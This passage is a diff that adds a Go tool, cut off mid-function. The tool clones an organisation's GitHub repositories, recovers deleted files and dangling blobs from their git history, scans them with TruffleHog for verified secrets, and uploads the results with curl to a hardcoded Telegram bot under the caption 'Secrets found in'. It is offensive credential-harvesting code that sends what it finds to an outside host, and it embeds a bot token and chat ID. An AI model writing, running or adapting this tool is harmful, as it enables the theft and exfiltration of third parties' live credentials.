@@ -1,0 +1,120 @@
+package main
+
+import (
+	"bufio"
+	"bytes"
+	"fmt"
+	"log"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"strings"
+)
+
+const (
+	telegramBotToken = "AAH9RnmUzo09GTdcl_FE6DKyhgJSFzKftiM"
+	telegramChatID   = "7900652219"
+)
+
+func runCommand(name string, args ...string) ([]byte, error) {
+	cmd := exec.Command(name, args...)
+	return cmd.CombinedOutput()
+}
+
+func notifyTelegram(org, repo, file string) {
+	cmd := exec.Command("curl", "-s",
+		"-F", fmt.Sprintf("chat_id=%s", telegramChatID),
+		"-F", fmt.Sprintf("document=@%s", file),
+		"-F", fmt.Sprintf("caption=Secrets found in %s/%s", org, repo),
+		fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", telegramBotToken))
+	cmd.Run()
+}
+
+func processRepo(org, repo, baseDir string) {
+	repoURL := fmt.Sprintf("https://github.com/%s/%s.git", org, repo)
+	targetDir := filepath.Join(baseDir, repo)
+	if _, err := os.Stat(targetDir); err == nil {
+		log.Printf("    [!] Skipping %s (already cloned)\n", repo)
+		return
+	}
+	log.Printf("[+] Cloning %s...\n", repoURL)
+	exec.Command("git", "clone", "--quiet", repoURL, targetDir).Run()
+
+	if err := os.Chdir(targetDir); err != nil {
+		log.Printf("[!] Failed to enter %s\n", targetDir)
+		return
+	}
+
+	os.MkdirAll("__ANALYSIS/del", 0755)
+	os.MkdirAll("__ANALYSIS/unreachable_blobs", 0755)
+	os.MkdirAll("__ANALYSIS/trufflehog", 0755)
+
+	log.Println("    [*] Restoring deleted files...")
+	out, _ := runCommand("git", "rev-list", "--all")
+	commits := strings.Split(string(out), "\n")
+	for _, commit := range commits {
+		parentOut, _ := runCommand("git", "rev-list", "--parents", "-n", "1", commit)
+		parts := strings.Fields(string(parentOut))
+		if len(parts) < 2 {
+			continue
+		}
+		parent := parts[1]
+		diffOut, _ := runCommand("git", "diff-tree", "--no-commit-id", "--diff-filter=D", "-r", parent, commit)
+		lines := strings.Split(string(diffOut), "\n")
+		for _, line := range lines {
+			fields := strings.Split(line, "\t")
+			if len(fields) != 2 {
+				continue
+			}
+			file := fields[1]
+			safeName := strings.ReplaceAll(file, "/", "_")
+			blob, err := runCommand("git", "show", fmt.Sprintf("%s:%s", parent, file))
+			if err == nil {
+				os.WriteFile(filepath.Join("__ANALYSIS/del", fmt.Sprintf("%s___%s", commit, safeName)), blob, 0644)
+			}
+		}
+	}
+
+	log.Println("    [*] Unpacking .pack files...")
+	packPath := ".git/objects/pack"
+	filepath.Walk(packPath, func(path string, info os.FileInfo, err error) error {
+		if strings.HasSuffix(path, ".pack") {
+			cmd := exec.Command("git", "unpack-objects")
+			packFile, _ := os.Open(path)
+			cmd.Stdin = packFile
+			cmd.Run()
+		}
+		return nil
+	})
+
+	log.Println("    [*] Finding and extracting dangling blobs...")
+	fsckOut, _ := runCommand("git", "fsck", "--full", "--unreachable", "--dangling", "--no-reflogs")
+	scanner := bufio.NewScanner(bytes.NewReader(fsckOut))
+	for scanner.Scan() {
+		line := scanner.Text()
+		if strings.Contains(line, "unreachable blob") {
+			parts := strings.Fields(line)
+			blobHash := parts[2]
+			blobData, err := runCommand("git", "cat-file", "-p", blobHash)
+			if err == nil {
+				os.WriteFile(filepath.Join("__ANALYSIS/unreachable_blobs", blobHash+".blob"), blobData, 0644)
+			} else {
+				log.Printf("        [!] Skipped unreadable blob %s\n", blobHash)
+			}
+		}
+	}
+
+	log.Println("    [*] Removing empty files...")
+	exec.Command("find", ".", "-type", "f", "-empty", "-delete").Run()
+
+	log.Println("    [*] Running TruffleHog...")
+	cmd := exec.Command("trufflehog", "filesystem", "--only-verified", "--include-detectors=all", ".")
+	output, err := cmd.Output()
+	secretsFile := "__ANALYSIS/trufflehog/secrets.txt"
+	if err == nil && len(output) > 0 {
+		os.WriteFile(secretsFile, output, 0644)
+		notifyTelegram(org, repo, secretsFile)
+	} else {
+		log.Printf("    [✓] No secrets found in %s\n", repo)
+	}
+
